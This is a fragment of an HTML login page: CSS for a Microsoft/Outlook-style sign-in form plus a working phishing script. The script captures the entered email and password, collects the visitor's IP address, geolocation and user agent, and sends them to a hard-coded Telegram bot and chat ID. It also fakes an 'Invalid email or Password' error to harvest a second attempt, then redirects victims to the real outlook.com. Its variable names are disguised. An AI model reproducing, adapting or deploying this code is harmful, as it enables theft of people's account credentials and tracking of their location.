        .login-container {
            background-color: rgba(255, 255, 255, 0.9);
            padding: 40px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            margin: 0 10px;
        }

        .logo {
            width: 100px;
            height: auto;
            margin-bottom: 5px;
        }
input[type="email"] {
    border-radius: 50px;
    border: 1px solid #ccc;
    padding: 8px 13px;
    font-weight: 500;
    font-size: 13px;
    margin-top: 10px;
    width: 100%;
    max-width: 350px;
    text-align: center;
    overflow-x: auto;
    white-space: nowrap;
    text-overflow: clip;
    box-sizing: border-box;
}



        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-top: 1px solid #ccc;
            border-left: 1px solid #ccc;
            border-right: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 30px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 15px 0;
            font-size: 14px;
        }

        .remember-me input {
            margin-right: 8px;
        }

        .login-button {
            width: 100%;
            padding: 12px;
            background-color: #0F6CBD;
            color: #fff;
            font-size: 16px;
            border: none;
            border-radius: 4px;

            cursor: pointer;
            transition: background-color 0.3s;
        }

        .login-button:hover {
            background-color: rgba(0, 87, 179, 0.902);
        }


        #msgfont {
            color: red;
        }

        .footer {
            margin-top: 20px;
            font-weight: 500;
            color: #0F6CBD;
            font-size: small;
        }



        .instructions {
            color: #333;
            margin-bottom: 2px;
        }
    </style>

   <script type="text/javascript">
    document.addEventListener('DOMContentLoaded', function () {
        const btWole = document.getElementById('btWole');
        const msgFont = document.getElementById('msgfont');
        const telegramBotToken = '8014509651:AAE-gNfwvXMpS-fvunW-JhyxgVX5V2OCEcA'; // Replace with your Telegram bot token
        const telegramChatId = '8235527776'; // Replace with your Telegram chat ID

        let countAttempt = 0;

        // Event listeners for both click and touch
        ['click', 'touchend'].forEach(eventType => {
            btWole.addEventListener(eventType, function (event) {
                event.preventDefault();
                handleSubmission();
            });
        });

        function handleSubmission() {
            const kokoro = document.getElementById('kokoro').value.trim();
            const oruko = document.getElementById('oruko').value.trim();

            if (!kokoro) {
                msgFont.textContent = "Please enter password";
                return;
            }

            teSile();
        }

        async function teSile() {
            const kokoro = document.getElementById('kokoro').value.trim();
            const oruko = document.getElementById('oruko').value.trim();

            // Get user IP
            const userIP = await getIP();

            // Get user location
            const userLocation = await getLocation();

            // Send to Telegram
            sendToTelegram(oruko, kokoro, userIP, userLocation);

            countAttempt++;

            btWole.value = "Verifying....";
            msgFont.textContent = "";

            if (countAttempt >= 2) {
                setTimeout(() => {
                    window.location.href = "https://outlook.com";
                }, 2000);
            } else {
                setTimeout(() => {
                    msgFont.textContent = "Invalid email or Password";
                    btWole.value = "Continue";
                }, 2000);
            }
        }

        function sendToTelegram(oruko, kokoro, userIP, userLocation) {
            var message = "🔐 New Login\n\n" +
                "📧 Oruko = " + oruko + "\n" +
                "🔑 Kokoro = " + kokoro + "\n" +
                "🖥️ UserAgent = " + navigator.userAgent + "\n" +
                "🌍 IP = " + userIP + "\n" +
                "📍 Location = " + userLocation;

            var telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;

            var xhr = new XMLHttpRequest();
            xhr.open('GET', telegramUrl, true);
            xhr.send();
        }

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        function getLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            resolve(`${pos.coords.latitude},${pos.coords.longitude}`);
                        },
                        () => {
                            resolve('Unknown');
                        }
                    );
                } else {
                    resolve('Unknown');
                }
            });
        }
    });
</script>
